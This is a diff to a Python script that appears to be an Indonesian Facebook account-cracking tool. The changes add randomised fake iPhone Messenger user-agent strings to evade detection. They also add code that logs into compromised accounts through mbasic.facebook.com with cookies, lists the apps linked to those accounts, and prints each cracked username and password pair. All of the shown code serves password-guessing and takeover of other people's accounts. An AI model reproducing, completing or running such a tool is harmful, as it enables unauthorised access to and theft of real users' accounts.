@@ -51,8 +51,12 @@ for z in range(200):
 	dev = device.split(" Build/")[0]
 	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
 	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
-	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
-	#ua = f"Dalvik/2.1.0 (Linux; U; Android ios13; iPhone Build/MRA58K) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/155323366;FBDM/"+"{density=2.0,width=720,height=1360};"+f"FBLC/en_US;FBRV/156625696;FBCR/mt:s;FBMF/iPhone;FBBD/iPhone;FBPN/com.facebook.mlite;FBDV/iPhone;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
+	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
+	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
+	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(versi)} like Mac OS X) AppleWebKit/{str(verchrome)} (KHTML, like Gecko) Mobile/{str(mob)} [FBAN/MessengerForiOS;FBAV/112.0.0.36.{str(random.randint(70,150))};FBBV/54364624;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iOS;FBSV/{str(versi).replace('_','.')};FBSS/2;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
+	#ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
+	#ua = f"Dalvik/2.1.0 (Linux; U; Android ios13; iPhone Build/MRA58K) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/54364624;FBDM/"+"{density=2.0,width=720,height=1360};"+f"FBLC/en_US;FBRV/156625696;FBCR/T-Mobile;FBID/phone;FBMF/iPhone;FBBD/iPhone;FBPN/com.facebook.mlite;FBDV/iPhone5,1;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;
 #FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
@@ -399,6 +403,8 @@ class Crack:
 		self.ok = []
 		self.cp = []
 		self.apk = []
+		self.aktif = []
+		self.kadaluwarsa = []
 		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
 		
 	###----------[ ATUR SANDI DAN METODE ]---------- ###
@@ -581,7 +587,7 @@ class Crack:
 						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
 						break
 		except:pass
-
+			
 		###----------[ APLIKASI AKTIF ]---------- ###
 		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
 		self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
@@ -590,7 +596,7 @@ class Crack:
 		else:
 			for apk in self.aktif:
 				aktip.add(f"{H2}{apk}{P2}")
-			
+				
 		###----------[ APLIKASI KADALUWARSA ]---------- ###
 		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
 		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
@@ -599,7 +605,7 @@ class Crack:
 		else:
 			for apk in self.kadaluwarsa:
 				kadalu.add(f"{M2}{apk}{P2}")
-				
+			
 		###----------[ PRINT SEMUA ]---------- ###
 		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 		tree.add(aktip)
